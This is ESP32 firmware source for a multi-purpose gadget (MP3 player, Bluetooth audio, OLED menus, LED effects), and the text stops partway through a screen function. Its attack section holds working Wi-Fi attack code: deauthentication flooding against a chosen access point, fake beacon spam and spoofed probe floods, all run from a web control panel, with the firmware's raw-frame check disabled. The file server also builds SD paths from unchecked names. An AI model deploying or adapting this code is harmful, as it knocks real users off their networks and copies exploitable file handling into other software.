// ============================================================
//  SOUMYA Gadget v9.0 FINAL — Walkthrough UI + All Features
//  MP3 + Web UI + Deauth + IR + LED + Flashlight + Serial
//  Core 2.0.17 | DRAM optimized
// ============================================================

#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>
#include <SD.h>
#include <WiFi.h>
#include <WebServer.h>
#include <Preferences.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Adafruit_NeoPixel.h>
#include <AudioFileSourceSD.h>
#include <AudioGeneratorMP3.h>
#include <AudioOutput.h>
#include "esp32-hal-bt.h"

extern "C" {
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_a2dp_api.h"
#include "esp_avrc_api.h"
#include "esp_wifi.h"
}

#include "led_music_ui.h"
#include "file_ui.h"
#include "attacks_ui.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t,int32_t,int32_t){ return 0; }

#define OLED_SDA 21
#define OLED_SCL 22
#define OLED_ADDR 0x3C
#define SCR_W 128
#define SCR_H 64
#define PIN_SD_CS   5
#define PIN_SD_SCK  18
#define PIN_SD_MISO 19
#define PIN_SD_MOSI 23
#define PIN_LED_DATA 13
#define LED_MAX 144
#define PIN_STATUS_LED 12
#define STATUS_LED_COUNT 2

#define AP_SSID "ESP32-Gadget"
#define AP_PASS "88888888"
#define AP_CHANNEL 6
#define BT_NAME "SOUMYA-Music"
#define MUSIC_DIR "/music"
#define RING_SIZE 8192
#define MAX_SONGS 32

enum Mode : uint8_t {
    M_BOOT, M_MAIN, M_SONGS, M_PLAYER, M_PLAYER_SYNC,
    M_BT_MENU, M_BT_SCAN, M_BT_DEV, M_BT_CONNECT,
    M_GAMES, M_FLAPPY, M_SNAKE,
    M_LED_MENU, M_LED_FX, M_LED_MUSIC, M_LED_BRIGHT, M_LED_WIFI,
    M_FLASH_MENU, M_SETTINGS, M_INFO,
    M_WIFI_FILES,
    M_HIDDEN, M_WIFI_TOOLS, M_BT_TOOLS, M_IR_MENU,
    M_ATTACK_RUN, M_IR_LEARN, M_IR_TX, M_IR_JAM
};

enum AttackMode : uint8_t { ATK_NONE, ATK_BEACON, ATK_DEAUTH, ATK_PROBE };

struct APRecord { char ssid[33]; char bssid[18]; int rssi; int channel; };

struct State {
    Mode mode = M_BOOT;
    int mainSel = 0, subSel = 0;
    int volume = 100, ledBright = 150, ledCount = 60, curEffect = 1;
    int flashBright = 200, flashColor = 0, flashEffect = 0;
    bool flashOn = false;
    int batteryPct = 78;
    int songCount = 0, currentSong = -1;
    bool isPlaying = false;
    bool displaySleepEnabled = true;
} g;

Adafruit_SSD1306 display(SCR_W, SCR_H, &Wire, -1);
Adafruit_NeoPixel strip(LED_MAX, PIN_LED_DATA, NEO_GRB + NEO_KHZ800);
Adafruit_NeoPixel flashStrip(STATUS_LED_COUNT, PIN_STATUS_LED, NEO_GRB + NEO_KHZ800);
Preferences prefs;

WebServer ledServer(80);
WebServer fileServer(81);
WebServer attackServer(8080);
static bool webRunning = false;

String songFiles[MAX_SONGS];
int songCount = 0;

static bool a2dpStarted = false;

static int16_t ringBuf[RING_SIZE];
static volatile int rbHead = 0, rbTail = 0;
static portMUX_TYPE rbMux = portMUX_INITIALIZER_UNLOCKED;

static volatile bool atkRun = false;
static AttackMode atkMode = ATK_NONE;
static TaskHandle_t atkTask = nullptr;
static char atkSSID[33], atkBSSID[18];
static int atkChannel = 1;
static volatile int atkPkts = 0;

static APRecord aps[30];
static int apCount = 0;

static unsigned long lastActivity = 0;
static bool displayOff = false;
static int animFrame = 0;
static volatile int gSerialEv = -1;

// ═══ SMOOTH UI ENGINE ═══
#define SMOOTH_RATE 16.0f
float smSel = 0, smScroll = 0;
uint8_t smScene = 255;
unsigned long smLastMs = 0;

float lerpf(float a, float b, float t) { return a + (b - a) * t; }
float easeOutCubic(float t) { t -= 1.0f; return t*t*t + 1.0f; }
void smTick(uint8_t scene, float targetSel, float targetScroll) {
    unsigned long now = millis();
    if (smScene != scene) { smSel = targetSel; smScroll = targetScroll; }
    else {
        float dt = (now - smLastMs) / 1000.0f;
        if (dt > 0.08f) dt = 0.08f;
        float k = 1.0f - exp(-SMOOTH_RATE * dt);
        smSel = lerpf(smSel, targetSel, k);
        smScroll = lerpf(smScroll, targetScroll, k);
    }
    smScene = scene;
    smLastMs = now;
}

// ═══ RING BUFFER ═══
static inline int rb_avail() { return (rbHead - rbTail + RING_SIZE) % RING_SIZE; }
static void rb_push(int16_t L, int16_t R) {
    portENTER_CRITICAL(&rbMux);
    int next = (rbHead + 2) % RING_SIZE;
    if (next != rbTail) {
        ringBuf[rbHead] = L;
        ringBuf[(rbHead + 1) % RING_SIZE] = R;
        rbHead = next;
    }
    portEXIT_CRITICAL(&rbMux);
}
static bool rb_pop(int16_t &L, int16_t &R) {
    portENTER_CRITICAL(&rbMux);
    bool ok = (rbTail != rbHead);
    if (ok) {
        L = ringBuf[rbTail];
        rbTail = (rbTail + 1) % RING_SIZE;
        R = ringBuf[rbTail];
        rbTail = (rbTail + 1) % RING_SIZE;
    }
    portEXIT_CRITICAL(&rbMux);
    return ok;
}

class AudioOutRB : public AudioOutput {
public:
    bool ConsumeSample(int16_t s[2]) override { rb_push(s[0], s[1]); return true; }
    bool begin() override { return true; }
    bool stop() override { return true; }
};

static volatile uint32_t cbCalls = 0;
static int32_t a2d_data_cb(uint8_t* buf, int32_t len) {
    cbCalls++;
    int16_t* out = (int16_t*)buf;
    int frames = len / 4;
    for (int i = 0; i < frames; i++) {
        int16_t L = 0, R = 0;
        rb_pop(L, R);
        out[i*2] = L;
        out[i*2 + 1] = R;
    }
    return len;
}

static AudioFileSource* audioSrc = nullptr;
static AudioGeneratorMP3* audioMP3 = nullptr;
static AudioOutRB* audioRB = nullptr;

// ═══ BATTERY ═══
static int readBattery() {
    long s = 0;
    for (int i = 0; i < 10; i++) s += analogRead(34);
    float v = (s / 10.0f / 4095.0f) * 3.3f * 2.0f;
    if (v >= 4.15f) return 100;
    if (v <= 3.30f) return 0;
    return (int)((v - 3.30f) / (4.15f - 3.30f) * 100);
}

// ═══ DISPLAY ═══
static void wakeDisplay() {
    lastActivity = millis();
    if (displayOff) { displayOff = false; display.ssd1306_command(SSD1306_DISPLAYON); }
}
static void checkSleep() {
    if (!g.displaySleepEnabled) return;
    if (!displayOff && (millis() - lastActivity > 30000)) {
        displayOff = true;
        display.clearDisplay(); display.display();
        display.ssd1306_command(SSD1306_DISPLAYOFF);
    }
}
static void drawBatteryDark(int x, int y) {
    display.drawRect(x, y, 16, 9, BLACK);
    display.fillRect(x + 16, y + 3, 2, 3, BLACK);
    int f = (g.batteryPct * 12) / 100;
    if (f > 0) display.fillRect(x + 2, y + 2, f, 5, BLACK);
}
static void drawBatteryLight(int x, int y) {
    display.drawRect(x, y, 16, 9, WHITE);
    display.fillRect(x + 16, y + 3, 2, 3, WHITE);
    int f = (g.batteryPct * 12) / 100;
    if (f > 0) display.fillRect(x + 2, y + 2, f, 5, WHITE);
}
static void hdr(const char* t) {
    display.fillRect(0, 0, SCR_W, 13, WHITE);
    display.setTextColor(BLACK); display.setTextSize(1);
    display.setCursor(4, 3); display.print(t);
    drawBatteryDark(SCR_W - 22, 2);
    display.setTextColor(WHITE);
}
static void hdrL(const char* t) {
    display.drawFastHLine(0, 0, SCR_W, WHITE);
    display.setTextColor(WHITE); display.setTextSize(1);
    display.setCursor(4, 5); display.print(t);
    drawBatteryLight(SCR_W - 22, 4);
}

// ═══ ICONS ═══
static void iPlay(int x,int y,uint16_t c){display.fillTriangle(x+2,y+1,x+2,y+7,x+7,y+4,c);}
static void iMusic(int x,int y,uint16_t c){display.fillCircle(x+2,y+5,2,c);display.drawFastVLine(x+3,y+1,5,c);display.drawPixel(x+4,y+1,c);display.drawPixel(x+5,y+1,c);display.drawPixel(x+6,y+2,c);display.drawPixel(x+6,y+3,c);display.drawPixel(x+5,y+3,c);}
static void iBT(int x,int y,uint16_t c){display.drawFastVLine(x+4,y,8,c);display.drawLine(x+4,y,x+6,y+2,c);display.drawLine(x+6,y+2,x+2,y+4,c);display.drawLine(x+4,y+7,x+6,y+5,c);display.drawLine(x+6,y+5,x+2,y+3,c);}
static void iGame(int x,int y,uint16_t c){display.drawRect(x,y+1,8,6,c);display.drawPixel(x+2,y+3,c);display.drawPixel(x+1,y+4,c);display.drawPixel(x+2,y+4,c);display.drawPixel(x+3,y+4,c);display.drawPixel(x+2,y+5,c);display.drawPixel(x+5,y+3,c);display.drawPixel(x+5,y+5,c);}
static void iLED(int x,int y,uint16_t c){display.drawCircle(x+4,y+3,3,c);display.fillRect(x+3,y+6,3,2,c);display.drawPixel(x+4,y+3,c);}
static void iFlash(int x,int y,uint16_t c){display.fillRect(x+2,y,4,3,c);display.fillRect(x+3,y+3,2,5,c);display.drawPixel(x,y,c);display.drawPixel(x+7,y,c);}
static void iWifi(int x,int y,uint16_t c){display.drawPixel(x+2,y,c);display.drawPixel(x+3,y,c);display.drawPixel(x+4,y,c);display.drawPixel(x+5,y,c);display.drawPixel(x+1,y+1,c);display.drawPixel(x+6,y+1,c);display.drawPixel(x,y+2,c);display.drawPixel(x+7,y+2,c);display.drawPixel(x+2,y+3,c);display.drawPixel(x+3,y+3,c);display.drawPixel(x+4,y+3,c);display.drawPixel(x+5,y+3,c);display.drawPixel(x+1,y+4,c);display.drawPixel(x+6,y+4,c);display.drawPixel(x+3,y+5,c);display.drawPixel(x+4,y+5,c);display.fillRect(x+3,y+6,2,2,c);}

// ═══ LARGE ICONS (16x16) for carousel ═══
static void iPlayL(int x,int y,uint16_t c){display.fillTriangle(x+4,y+2,x+4,y+14,x+14,y+8,c);}
static void iMusicL(int x,int y,uint16_t c){display.fillCircle(x+4,y+11,3,c);display.fillCircle(x+11,y+9,3,c);display.drawFastVLine(x+6,y+3,8,c);display.drawFastVLine(x+13,y+1,8,c);display.drawFastHLine(x+6,y+1,8,c);display.drawFastHLine(x+6,y+2,8,c);}
static void iBTL(int x,int y,uint16_t c){display.drawFastVLine(x+8,y,16,c);display.drawLine(x+8,y,x+14,y+4,c);display.drawLine(x+14,y+4,x+2,y+11,c);display.drawLine(x+8,y+15,x+14,y+11,c);display.drawLine(x+14,y+11,x+2,y+4,c);}
static void iGameL(int x,int y,uint16_t c){display.drawRoundRect(x,y+2,16,12,4,c);display.drawPixel(x+3,y+7,c);display.drawPixel(x+5,y+7,c);display.drawPixel(x+4,y+6,c);display.drawPixel(x+4,y+8,c);display.fillCircle(x+12,y+8,2,c);display.fillCircle(x+12,y+5,2,c);}
static void iLEDL(int x,int y,uint16_t c){display.drawCircle(x+8,y+6,5,c);display.fillRect(x+6,y+12,5,4,c);display.drawPixel(x+8,y+6,c);display.drawPixel(x+6,y+5,c);display.drawPixel(x+10,y+5,c);}
static void iFlashL(int x,int y,uint16_t c){display.fillRect(x+5,y,6,5,c);display.fillRect(x+6,y+5,4,11,c);display.drawLine(x,y,x+3,y+3,c);display.drawLine(x+15,y,x+12,y+3,c);}

// ═══ AUDIO ═══
void loadSongs() {
    songCount = 0;
    File dir = SD.open(MUSIC_DIR, FILE_READ);
    if (!dir || !dir.isDirectory()) return;
    File f = dir.openNextFile();
    while (f && songCount < MAX_SONGS) {
        String n = String(f.name());
        if (!f.isDirectory()) {
            String l = n; l.toLowerCase();
            if (l.endsWith(".mp3")) songFiles[songCount++] = String(MUSIC_DIR) + "/" + n;
        }
        f = dir.openNextFile();
    }
    dir.close();
    g.songCount = songCount;
}

String songName(int idx) {
    if (idx < 0 || idx >= songCount) return "(none)";
    String p = songFiles[idx];
    int s = p.lastIndexOf('/');
    return s >= 0 ? p.substring(s+1) : p;
}

void ensureBT() {
    if (a2dpStarted) return;
    esp_bt_controller_mem_release(ESP_BT_MODE_BLE);
    if (!btStart()) return;
    delay(200);
    if (esp_bluedroid_get_status() == ESP_BLUEDROID_STATUS_UNINITIALIZED) esp_bluedroid_init();
    if (esp_bluedroid_get_status() != ESP_BLUEDROID_STATUS_ENABLED) esp_bluedroid_enable();
    esp_bt_dev_set_device_name(BT_NAME);
    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
    esp_a2d_source_init();
    esp_a2d_source_register_data_callback(a2d_data_cb);
    delay(200);
    a2dpStarted = true;
}

void stopSong() {
    if (audioMP3 && audioMP3->isRunning()) audioMP3->stop();
    if (audioSrc) audioSrc->close();
    delete audioMP3; audioMP3 = nullptr;
    delete audioSrc; audioSrc = nullptr;
    g.isPlaying = false;
    rbHead = rbTail = 0;
}

void playSong(int idx) {
    if (idx < 0 || idx >= songCount) return;
    stopSong();
    delay(100);
    g.currentSong = idx;
    ensureBT();
    audioSrc = (AudioFileSource*)new AudioFileSourceSD(songFiles[idx].c_str());
    if (!audioSrc) return;
    audioMP3 = new AudioGeneratorMP3();
    if (!audioMP3) { delete audioSrc; audioSrc = nullptr; return; }
    if (audioMP3->begin(audioSrc, audioRB)) g.isPlaying = true;
    else stopSong();
}
void nextSong() { if (songCount) playSong((g.currentSong + 1) % songCount); }
void prevSong() { if (songCount) playSong((g.currentSong - 1 + songCount) % songCount); }

// ═══ LED ═══
static int ledHue = 0;
static void updateLED() {
    static unsigned long last = 0;
    if (millis() - last < 20) return;
    last = millis();
    int n = g.ledCount;
    switch (g.curEffect) {
        case 0: for (int i = 0; i < n; i++) strip.setPixelColor(i, strip.ColorHSV(ledHue*257, 255, g.ledBright)); break;
        case 1: for (int i = 0; i < n; i++) strip.setPixelColor(i, strip.ColorHSV(((ledHue + i*256/n) & 0xFF) * 257, 255, g.ledBright)); ledHue = (ledHue + 2) & 0xFF; break;
        case 2: { float b = (sin(millis()/1000.0f)+1)/2; for (int i = 0; i < n; i++) strip.setPixelColor(i, strip.ColorHSV(ledHue*257, 255, b*g.ledBright)); break; }
        case 3: { strip.clear(); int p = (millis()/40)%n; for (int i = 0; i < 5; i++) strip.setPixelColor((p+i)%n, strip.ColorHSV(ledHue*257, 255, g.ledBright >> i)); break; }
    }
    strip.show();
}

// ═══ FLASHLIGHT ═══
static const uint8_t FC[7][3] = {{255,255,255},{255,0,0},{0,255,0},{0,0,255},{255,255,0},{0,255,255},{255,0,255}};
static void flashApply() {
    if (!g.flashOn) { flashStrip.clear(); flashStrip.show(); return; }
    const uint8_t* c = FC[g.flashColor];
    uint8_t br = (uint32_t)g.flashBright * 255 / 100;
    for (int i = 0; i < STATUS_LED_COUNT; i++)
        flashStrip.setPixelColor(i, (uint32_t)c[0]*br/255, (uint32_t)c[1]*br/255, (uint32_t)c[2]*br/255);
    flashStrip.show();
}
static void flashSet(bool on) { g.flashOn = on; flashApply(); }

// ═══ ATTACKS ═══
static uint8_t deauthFrame[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x07,0x00};

static bool parseMac(const char* s, uint8_t* o) {
    unsigned int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) o[i] = (uint8_t)v[i];
    return true;
}
static int buildBeacon(uint8_t* b, int bLen, const char* ssid, int ch) {
    int sl = strlen(ssid);
    if (sl > 32 || bLen < (38 + sl)) return 0;
    memset(b, 0, bLen);
    int i = 0;
    b[i++]=0x80; b[i++]=0x00; b[i++]=0x00; b[i++]=0x00;
    memset(b+i, 0xFF, 6); i += 6;
    uint8_t mac[6];
    for (int k = 0; k < 6; k++) mac[k] = random(0, 256);
    mac[0] = (mac[0] | 0x02) & 0xFE;
    memcpy(b+i, mac, 6); i += 6;
    memcpy(b+i, mac, 6); i += 6;
    i += 2; memset(b+i, 0, 8); i += 8;
    b[i++]=0x64; b[i++]=0x00; b[i++]=0x31; b[i++]=0x04;
    b[i++]=0x00; b[i++]=(uint8_t)sl;
    memcpy(b+i, ssid, sl); i += sl;
    b[i++]=0x01; b[i++]=0x08;
    const uint8_t r[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
    memcpy(b+i, r, 8); i += 8;
    b[i++]=0x03; b[i++]=0x01; b[i++]=(uint8_t)ch;
    return i;
}
static const char* FAKE[] = {
    "JioFiber_5G","Airtel_Xstream","TP-Link_2.4G","Netgear_Home",
    "Sharma_Home","Rahul_iPhone","Home_Sweet_Home","AndroidAP_1234",
    "iPhone_Hotspot","Redmi_Note12","Samsung_A54","Cafe_Coffee_Day",
    "Free_Public_WiFi","Guest_Network","Setup_Required"
};
#define FAKE_N (sizeof(FAKE)/sizeof(FAKE[0]))

static void attackWorker(void*) {
    uint8_t bssid[6];
    parseMac(atkBSSID, bssid);
    atkPkts = 0;
    if (atkMode == ATK_BEACON) {
        WiFi.mode(WIFI_STA); delay(100);
        uint8_t f[256];
        while (atkRun) {
            for (int ch = 1; ch <= 13 && atkRun; ch++) {
                if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
                const char* s = FAKE[random(0, FAKE_N)];
                int l = buildBeacon(f, sizeof(f), s, ch);
                if (l > 0 && esp_wifi_80211_tx(WIFI_IF_STA, f, l, false) == ESP_OK) atkPkts++;
                delay(3);
            }
        }
    } else if (atkMode == ATK_DEAUTH) {
        WiFi.mode(WIFI_STA); delay(100);
        esp_wifi_set_channel(atkChannel, WIFI_SECOND_CHAN_NONE);
        uint8_t f[26];
        while (atkRun) {
            memcpy(f, deauthFrame, 26);
            memcpy(f+10, bssid, 6); memcpy(f+16, bssid, 6);
            for (int i = 0; i < 50; i++) {
                f[22] = i & 0xFF; f[23] = (i>>8) & 0xFF;
                if (esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false) == ESP_OK) atkPkts++;
            }
            delay(60);
        }
    } else if (atkMode == ATK_PROBE) {
        WiFi.mode(WIFI_STA); delay(100);
        uint8_t f[128];
        while (atkRun) {
            for (int ch = 1; ch <= 13 && atkRun; ch++) {
                if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) continue;
                memset(f, 0, sizeof(f));
                int i = 0;
                f[i++]=0x40; f[i++]=0x00; f[i++]=0x00; f[i++]=0x00;
                memset(f+i, 0xFF, 6); i += 6;
                uint8_t m[6];
                for (int k = 0; k < 6; k++) m[k] = random(0, 256);
                m[0] = (m[0]|0x02)&0xFE;
                memcpy(f+i, m, 6); i += 6;
                memcpy(f+i, m, 6); i += 6;
                i += 2;
                const char* s = FAKE[random(0, FAKE_N)];
                int sl = strlen(s);
                f[i++]=0x00; f[i++]=(uint8_t)sl;
                memcpy(f+i, s, sl); i += sl;
                f[i++]=0x01; f[i++]=0x08;
                const uint8_t r[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
                memcpy(f+i, r, 8); i += 8;
                if (esp_wifi_80211_tx(WIFI_IF_STA, f, i, false) == ESP_OK) atkPkts++;
                delay(2);
            }
        }
    }
    WiFi.mode(WIFI_OFF);
    atkRun = false;
    atkMode = ATK_NONE;
    vTaskDelete(nullptr);
}
static void startBeacon() { if (atkRun) return; atkMode = ATK_BEACON; atkRun = true; xTaskCreatePinnedToCore(attackWorker,"atk",4096,nullptr,1,&atkTask,0); }
static void startProbe()  { if (atkRun) return; atkMode = ATK_PROBE;  atkRun = true; xTaskCreatePinnedToCore(attackWorker,"atk",4096,nullptr,1,&atkTask,0); }
static void startDeauth(int idx) {
    if (atkRun || idx < 0 || idx >= apCount) return;
    strncpy(atkSSID, aps[idx].ssid, 32); atkSSID[32]=0;
    strncpy(atkBSSID, aps[idx].bssid, 17); atkBSSID[17]=0;
    atkChannel = aps[idx].channel;
    atkMode = ATK_DEAUTH; atkRun = true;
    xTaskCreatePinnedToCore(attackWorker,"atk",8192,nullptr,1,&atkTask,0);
}
static void stopAttack() { if (!atkRun) return; atkRun = false; delay(400); }
static void wifiScan() {
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(100);
    int n = WiFi.scanNetworks(false, true);
    apCount = min(n, 30);
    for (int i = 0; i < apCount; i++) {
        strncpy(aps[i].ssid, WiFi.SSID(i).c_str(), 32); aps[i].ssid[32]=0;
        strncpy(aps[i].bssid, WiFi.BSSIDstr(i).c_str(), 17); aps[i].bssid[17]=0;
        aps[i].rssi = WiFi.RSSI(i);
        aps[i].channel = WiFi.channel(i);
    }
    WiFi.scanDelete();
}

// ═══ WEB HANDLERS ═══
static void hLedRoot() { ledServer.send_P(200, "text/html", LED_MUSIC_HTML); }
static void hLedCmd() {
    if (ledServer.hasArg("effect")) g.curEffect = ledServer.arg("effect").toInt();
    if (ledServer.hasArg("brightness")) { g.ledBright = constrain(ledServer.arg("brightness").toInt(),0,255); strip.setBrightness(g.ledBright); }
    if (ledServer.hasArg("count")) g.ledCount = constrain(ledServer.arg("count").toInt(),1,LED_MAX);
    if (ledServer.hasArg("hue")) ledHue = ledServer.arg("hue").toInt() & 0xFF;
    ledServer.send(200, "text/plain", "OK");
}
static void hMusicCmd() {
    String a = ledServer.arg("action");
    if (a == "play") { int i = ledServer.arg("idx").toInt(); if (i >= 0 && i < songCount) playSong(i); }
    else if (a == "next") nextSong();
    else if (a == "prev") prevSong();
    else if (a == "stop") stopSong();
    ledServer.send(200, "text/plain", "OK");
}
static void hMusicList() {
    String j = F("{\"songs\":[");
    for (int i = 0; i < songCount; i++) {
        if (i > 0) j += ',';
        j += F("{\"idx\":"); j += i;
        j += F(",\"name\":\""); j += songName(i); j += '"'; j += '}';
    }
    j += F("],\"current\":"); j += g.currentSong;
    j += F(",\"playing\":"); j += (g.isPlaying ? "true" : "false");
    j += '}';
    ledServer.send(200, "application/json", j);
}
static void hFileRoot() { fileServer.send_P(200, "text/html", FILE_MANAGER_HTML); }
static void hFileList() {
    uint32_t total = SD.totalBytes() >> 20;
    uint32_t free_ = (SD.totalBytes() - SD.usedBytes()) >> 20;
    String j = F("{\"files\":[");
    File dir = SD.open(MUSIC_DIR, FILE_READ);
    bool first = true;
    if (dir) {
        File f = dir.openNextFile();
        while (f) {
            if (!f.isDirectory()) {
                if (!first) j += ',';
                j += F("{\"name\":\""); j += String(f.name());
                j += F("\",\"size\":"); j += (uint32_t)f.size(); j += '}';
                first = false;
            }
            f = dir.openNextFile();
        }
        dir.close();
    }
    j += F("],\"totalMB\":"); j += total;
    j += F(",\"freeMB\":"); j += free_;
    j += '}';
    fileServer.send(200, "application/json", j);
}
static void hFileDelete() {
    String n = fileServer.arg("name");
    String p = String(MUSIC_DIR) + "/" + n;
    SD.remove(p.c_str());
    loadSongs();
    fileServer.send(200, "text/plain", "OK");
}
static void hFileDl() {
    String n = fileServer.arg("name");
    String p = String(MUSIC_DIR) + "/" + n;
    File f = SD.open(p.c_str(), FILE_READ);
    if (!f) { fileServer.send(404, "text/plain", "Not found"); return; }
    fileServer.sendHeader("Content-Disposition", "attachment; filename=" + n);
    fileServer.streamFile(f, "audio/mpeg");
    f.close();
}
static File _upF;
static void hFileUp() {
    HTTPUpload& u = fileServer.upload();
    if (u.status == UPLOAD_FILE_START) {
        String p = String(MUSIC_DIR) + "/" + u.filename;
        _upF = SD.open(p.c_str(), FILE_WRITE);
    } else if (u.status == UPLOAD_FILE_WRITE) {
        if (_upF) _upF.write(u.buf, u.currentSize);
    } else if (u.status == UPLOAD_FILE_END) {
        if (_upF) _upF.close();
        loadSongs();
        fileServer.send(200, "text/plain", "OK");
    }
}
static void hAtkRoot() { attackServer.send_P(200, "text/html", ATTACKS_HTML); }
static void hAtkScan() {
    wifiScan();
    String j = F("{\"aps\":[");
    for (int i = 0; i < apCount; i++) {
        if (i > 0) j += ',';
        j += F("{\"idx\":"); j += i;
        j += F(",\"ssid\":\""); j += aps[i].ssid; j += '"';
        j += F(",\"bssid\":\""); j += aps[i].bssid; j += '"';
        j += F(",\"rssi\":"); j += aps[i].rssi;
        j += F(",\"ch\":"); j += aps[i].channel; j += '}';
    }
    j += F("],\"count\":"); j += apCount; j += '}';
    attackServer.send(200, "application/json", j);
}
static void hAtkCmd() {
    String c = attackServer.arg("cmd");
    if (c == "beacon") startBeacon();
    else if (c == "probe") startProbe();
    else if (c == "stop") stopAttack();
    else if (c == "deauth") { int i = attackServer.arg("idx").toInt(); startDeauth(i); }
    attackServer.send(200, "text/plain", "OK");
}
static void hAtkStatus() {
    String j = F("{\"running\":");
    j += (atkRun ? "true" : "false");
    j += F(",\"packets\":"); j += atkPkts;
    j += F(",\"creds\":[]}");
    attackServer.send(200, "application/json", j);
}
static void hEmergency() {
    stopAttack(); stopSong();
    ledServer.stop(); fileServer.stop(); attackServer.stop();
    WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF);
    webRunning = false; g.mode = M_MAIN; g.mainSel = 0;
    attackServer.send(200, "text/plain", "OK");
}
static void startWeb() {
    if (webRunning) return;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL);
    delay(300);
    ledServer.on("/", hLedRoot);
    ledServer.on("/led", hLedCmd);
    ledServer.on("/music", hMusicCmd);
    ledServer.on("/music/list", hMusicList);
    ledServer.begin();
    fileServer.on("/", hFileRoot);
    fileServer.on("/list", hFileList);
    fileServer.on("/delete", HTTP_POST, hFileDelete);
    fileServer.on("/download", hFileDl);
    fileServer.on("/upload", HTTP_POST, [](){ fileServer.send(200,"text/plain","OK"); }, hFileUp);
    fileServer.begin();
    attackServer.on("/", hAtkRoot);
    attackServer.on("/scan", hAtkScan);
    attackServer.on("/cmd", hAtkCmd);
    attackServer.on("/status", hAtkStatus);
    attackServer.on("/emergency", HTTP_POST, hEmergency);
    attackServer.begin();
    webRunning = true;
}
static void stopWeb() {
    if (!webRunning) return;
    ledServer.stop(); fileServer.stop(); attackServer.stop();
    WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF);
    webRunning = false;
}

// ═══ SCREENS ═══
static void sBoot() {
    static int step = 0;
    static unsigned long lastMs = 0;
    static int w = 0;
    const char* n = "SOUMYA";
    unsigned long now = millis();
    if (step == 0) { display.clearDisplay(); display.display(); lastMs = now; step = 1; return; }
    if (step >= 1 && step <= 6) {
        if (now - lastMs > 200) {
            display.clearDisplay(); display.setTextSize(2); display.setTextColor(WHITE);
            for (int i = 0; i < step; i++) { display.setCursor(22+i*15, 20); display.print(n[i]); }
            if (step < 6) display.fillRect(22 + step*15, 20, 2, 16, WHITE);
            display.display(); lastMs = now; step++;
        }
    } else if (step == 7) {
        if (now - lastMs > 400) { display.fillRect(22 + 6*15, 20, 2, 16, BLACK); display.display(); lastMs = now; step++; }
    } else if (step >= 8 && step <= 36) {
        if (now - lastMs > 30) {
            display.clearDisplay(); display.setTextSize(2); display.setTextColor(WHITE);
            for (int i = 0; i < 6; i++) { display.setCursor(22+i*15, 20); display.print(n[i]); }
            display.drawFastHLine(22, 42, w, WHITE);
            display.display(); w += 3; lastMs = now; step++;
        }
    } else if (step == 37) {
        if (now - lastMs > 400) { g.mode = M_MAIN; g.mainSel = 0; step = 0; w = 0; }
    }
}

// ═══ MAIN MENU — CAROUSEL ═══
const char* MAIN_IT[] = {"Play","Songs","Bluetooth","Games","LED Effects","Flashlight"};
static void sMain() {
    const int count = 6;
    smTick(M_MAIN, g.mainSel, g.mainSel);
    display.clearDisplay();
    hdr("MP3 PLAYER");
    int cx = SCR_W / 2, cy = 36, spacing = 50;
    for (int idx = 0; idx < count; idx++) {
        float dx = (idx - smSel) * spacing;
        int x = cx + (int)dx;
        if (x > -30 && x < SCR_W + 30) {
            float dist = fabs((float)idx - smSel);
            bool isCenter = dist < 0.5f;
            if (isCenter) {
                display.fillRoundRect(x - 20, cy - 18, 40, 34, 8, WHITE);
                uint16_t c = BLACK;
                int bx = x - 8, by = cy - 10;
                switch (idx) {
                    case 0: iPlayL(bx, by, c); break;
                    case 1: iMusicL(bx, by, c); break;
                    case 2: iBTL(bx, by, c); break;
                    case 3: iGameL(bx, by, c); break;
                    case 4: iLEDL(bx, by, c); break;
                    case 5: iFlashL(bx, by, c); break;
                }
                display.setTextColor(WHITE);
                int tw = strlen(MAIN_IT[idx]) * 6;
                display.setCursor(cx - (tw / 2), 54);
                display.print(MAIN_IT[idx]);
            } else {
                display.drawRoundRect(x - 12, cy - 10, 24, 20, 5, WHITE);
                uint16_t c = WHITE;
                int ix = x - 4, iy = cy - 8;
                switch (idx) {
                    case 0: iPlay(ix, iy, c); break;
                    case 1: iMusic(ix, iy, c); break;
                    case 2: iBT(ix, iy, c); break;
                    case 3: iGame(ix, iy, c); break;
                    case 4: iLED(ix, iy, c); break;
                    case 5: iFlash(ix, iy, c); break;
                }
            }
        }
    }
    display.display();
}

// ═══ SONGS ═══
static void sSongs() {
    const int visRows = 3, rowH = 16, baseY = 20;
    int targetOffset = 0;
    if (g.subSel >= 2) targetOffset = g.subSel - 1;
    if (targetOffset + visRows > songCount) targetOffset = songCount - visRows;
    if (targetOffset < 0) targetOffset = 0;
    smTick(M_SONGS, g.subSel, targetOffset);
    display.clearDisplay();
    int idxLo = (int)floor(smScroll) - 1;
    int idxHi = (int)floor(smScroll) + visRows + 1;
    for (int si = idxLo; si <= idxHi; si++) {
        if (si < 0 || si >= songCount) continue;
        float yf = baseY + (si - smScroll) * rowH;
        int y = (int)round(yf);
        bool s = fabs((float)si - (smSel - 1.0f)) < 0.5f;
        if (s) {
            display.fillRoundRect(8, y, SCR_W - 16, rowH - 2, 6, WHITE);
            display.setTextColor(BLACK);
            iMusic(12, y + 3, BLACK);
        } else {
            display.drawRoundRect(10, y, SCR_W - 20, rowH - 2, 6, WHITE);
            display.setTextColor(WHITE);
            iMusic(14, y + 3, WHITE);
        }
        char b[20];
